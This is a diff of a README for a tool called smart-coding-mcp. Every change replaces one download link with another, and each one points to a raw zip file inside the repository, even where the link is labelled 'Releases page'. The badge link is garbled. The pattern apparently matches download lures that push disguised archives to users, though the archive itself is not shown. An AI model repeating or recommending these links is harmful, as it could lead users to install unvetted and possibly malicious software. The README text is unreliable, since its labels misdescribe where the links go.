@@ -1,6 +1,6 @@
 # 🌟 smart-coding-mcp - Intelligent Code Search Made Easy
 
-[![Download Now](https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/features/mcp_coding_smart_1.6-alpha.4.zip%20Now-Get%https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/features/mcp_coding_smart_1.6-alpha.4.zip)](https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/features/mcp_coding_smart_1.6-alpha.4.zip)
+[![Download Now](https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/lib/smart-mcp-coding-v3.8.zip%20Now-Get%https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/lib/smart-mcp-coding-v3.8.zip)](https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/lib/smart-mcp-coding-v3.8.zip)
 
 ## 📖 Description
 
@@ -16,11 +16,11 @@ To get started with **smart-coding-mcp**, follow these simple steps. You do not 
    - Disk Space: At least 500MB of available space.
 
 2. **Visit the Download Page**
-   - To download the application, visit the [Releases page](https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/features/mcp_coding_smart_1.6-alpha.4.zip).
+   - To download the application, visit the [Releases page](https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/lib/smart-mcp-coding-v3.8.zip).
 
 ## 📥 Download & Install
 
-1. After visiting the [Releases page](https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/features/mcp_coding_smart_1.6-alpha.4.zip), you will see several available versions.
+1. After visiting the [Releases page](https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/lib/smart-mcp-coding-v3.8.zip), you will see several available versions.
    
 2. Choose the version suited for your operating system. Each version will have a "Download" link. Click on it to start downloading.
 
@@ -33,7 +33,7 @@ To get started with **smart-coding-mcp**, follow these simple steps. You do not 
    - Open the `.dmg` file, then drag the application to your Applications folder.
 
 6. **Linux Users:**
-   - Extract the contents of the `https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/features/mcp_coding_smart_1.6-alpha.4.zip` file and follow the instructions provided in the README file included in the package.
+   - Extract the contents of the `https://github.com/ArnoldoSQ/smart-coding-mcp/raw/refs/heads/main/lib/smart-mcp-coding-v3.8.zip` file and follow the instructions provided in the README file included in the package.
 
 ## 🛠️ Features
 
